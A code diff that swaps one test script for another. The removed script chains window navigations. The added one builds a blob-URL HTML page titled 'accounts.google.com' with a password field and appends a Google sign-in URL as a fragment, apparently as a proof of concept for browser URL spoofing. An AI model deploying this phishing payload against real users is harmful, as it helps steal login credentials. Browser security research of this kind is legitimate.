@@ -1,37 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Navigation Test</title>
-</head>
-
-<body>
-
-<h1>wait</h1>
-
 <script>
-
-async function run() {
-
-  // Step 1: open same-origin page
-  let w = window.open(location.href);
-
-  // small delay so window loads
-  await new Promise(r => setTimeout(r, 500));
-
-  // Step 2: navigate to target URL
-  w.location = "https://http.cat/200";
-
-  // simulate timing gap
-  await new Promise(r => setTimeout(r, 1000));
-
-  // Step 3: final navigation
-  w.location = "data:text/html,<h1>foo</h1>";
-
+function f(){
+  b = new Blob(["<title>accounts.google.com</title><h1>attacker blob page</h1><input autofocus placeholder=password>"], {type:"text/html"});
+  location = URL.createObjectURL(b) + "#https://accounts.google.com/signin";
 }
-
-setTimeout(run, 2000);
-
 </script>
-
-</body>
-</html>
+<a href="#" onclick="f()">click</a>
